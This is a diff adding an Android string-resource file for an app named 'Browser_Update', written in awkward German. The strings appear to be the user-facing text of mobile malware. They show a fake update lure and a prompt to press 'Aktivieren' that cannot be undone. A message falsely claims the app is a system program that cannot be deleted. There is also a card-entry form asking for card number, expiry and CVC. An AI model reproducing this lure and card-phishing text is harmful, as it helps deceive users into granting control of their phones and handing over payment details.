@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Browser_Update</string>
+    <string name="warn_win">Die Einstellung der Hinzufügungen</string>
+    <string name="denied">"Die Operation ist verboten!
+
+ Das Systemprogramm kann nicht gelöscht sein."</string>
+    <string name="continues">Fortsetzen</string>
+    <string name="pls_wait">Warten Sie mal</string>
+    <string name="reg">"
+Warten Sie mal.
+
+Auspacken der Komponenten…
+"</string>
+    <string name="plugin">Installation abgeschlossen ist</string>
+    <string name="warn">"Um fortzusetzen, drücken Sie im nächsten Fenster die Taste /Aktivieren/.nie gegebene Operation kann nicht gebrochen sein.
+
+ Mehr Information können Sie hier finden:
+
+http://redtube.com"</string>
+    <string name="mm">MM</string>
+    <string name="yy">JJ</string>
+    <string name="cvv">CVC</string>
+    <string name="add_card">Karteninformationen eingeben</string>
+    <string name="card_number">Kartennummer</string>
+    <string name="save_card">SPEICHERN</string>
+    <string name="saving">Wird gespeichert…</string>
+    <string name="year_err">Ungültiges Jahr</string>
+    <string name="month_err">Ungültiger Monat</string>
+    <string name="cvv_err">Ungültiger CVC</string>
+    <string name="cc_err">Ungültige Kreditkartennummer</string>
+</resources>
